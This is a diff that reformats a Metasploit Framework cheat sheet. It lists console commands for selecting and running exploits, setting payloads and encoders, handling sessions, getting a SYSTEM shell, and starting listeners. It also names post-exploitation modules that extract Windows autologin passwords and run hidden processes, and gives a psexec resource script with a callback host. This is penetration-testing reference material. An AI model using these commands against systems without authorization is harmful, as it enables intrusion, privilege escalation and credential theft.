@@ -1,121 +1,192 @@
 # Metasploit Framework (MSF)
-The world’s most used penetration testing framework
+
+> The world’s most used penetration testing framework
 [Metasploit](https://www.metasploit.com)
 
-- - - -
 ## start
-start db
-`msfdb start`  or `systemctl start postgresql`
 
-start metasploit framework console
-`msfconsole`
+Start db
+```bash
+msfdb start
+```
+or
+```bash
+systemctl start postgresql
+```
 
-- - - -
-## exploits
-select exploit
-`use <exploit>`
+Start metasploit framework console
+```bash
+msfconsole
+```
 
-run exploit
-`run` or `exploit`
+## Exploits
 
-- - - -
-## options
+Select exploit
+```bash
+use <exploit>
+```
+
+Run exploit
+```bash
+run
+```
+or
+```bash
+exploit
+```
+
+## Options
+
+Show options
+```bash
 show options
-`show options`
+```
 
-show advanced options
-`show advanced`
+Show advanced options
+```bash
+show advanced
+```
 
-set option
-`set <option> <value>`
+Set option
+```bash
+set <option> <value>
+```
 
-set option (global)
-`setg <option> <value>`
+Set option (global)
+```bash
+setg <option> <value>
+```
 
-- - - -
-## payloads
+## Payloads
+
+Show payloads
+```bash
 show payloads
-`show payloads`
+```
 
-select payload
-`set payload <payload>`
+Select payload
+```bash
+set payload <payload>
+```
 
-- - - -
-## sessions
-show sessions
-`sessions -h`
+## Sessions
 
-interact with session
-`sessions -i 1`
+Show sessions
+```bash
+sessions -h
+```
 
-send session to background
-`background` 
+Interact with session
+```bash
+sessions -i 1
+```
 
-- - - -
-## meterpreter
+Send session to background
+```bash
+background
+```
+
+## Meterpreter
+
 The **shell** command will present you with a standard shell on the target system.
-`shell`
+```bash
+shell
+```
 
 Metasploit has a Meterpreter script, **getsystem**, that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system.
-`getsystem`
+```bash
+getsystem
+```
 
-- - - -
-## encoders
+## Encoders
+
+Show encoders
+```bash
 show encoders
-`show encoders`
+```
 
-select encoder
-`set encoder <encoder>`
+Select encoder
+```bash
+set encoder <encoder>
+```
 
-- - - -
-## misc
-search for exploits
-`search <term>`
+## Misc
 
-go back
-`back`
+Search for exploits
+```bash
+search <term>
+```
 
-display help
-`help`
+Go back
+```bash
+back
+```
 
-get info about current context?
-`info`
+Display help
+```bash
+help
+```
 
-`show auxiliary` 
+Get info about current context?
+```bash
+info
+```
 
-- - - -
-## multi/handler
-just start listener
-`use exploit/multi/handler`
+```bash
+show auxiliary
+```
 
-- - - -
-## post exploitation
+## Multi/handler
+
+Just start listener
+```bash
+use exploit/multi/handler
+```
+
+## Post exploitation
+
 This module suggests local meterpreter exploits that can be used.
-`use post/multi/recon/local_exploit_suggester`
+```bash
+use post/multi/recon/local_exploit_suggester
+```
 
 This module extracts the plain-text Windows user login password in Registry.
-`use post/windows/gather/credentials/windows_autologin`
+```bash
+use post/windows/gather/credentials/windows_autologin
+```
 
 This module will login with the specified username/password and execute the supplied command as a hidden process.
-`use post/windows/manage/run_as`
+```bash
+use post/windows/manage/run_as
+```
 
-### meterpreter session
-migrate to other (e.g. more stable) process
-`migrate`
+### Meterpreter session
 
-get system info
-`sysinfo`
+Migrate to other (e.g. more stable) process
+```bash
+migrate
+```
 
-port forwarding
-`portfwd add -l <port> -r 127.0.0.1 -p <port>`
+Get system info
+```bash
+sysinfo
+```
 
-- - - -
+Port forwarding
+```bash
+portfwd add -l <port> -r 127.0.0.1 -p <port>
+```
+
 ## Resource Scripts
+
 Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit.
 
-`msfconsole -r demo.rc`
+```bash
+msfconsole -r demo.rc
+```
 
 ### demo.rc
+
 ```
 use exploit/windows/smb/psexec
 set rhost <ip>
@@ -127,5 +198,3 @@ set AutoRunScript post/windows/manage/smart_migrate
 setg lport 443
 setg lhost <own-ip>
 ```
-
-- - - -
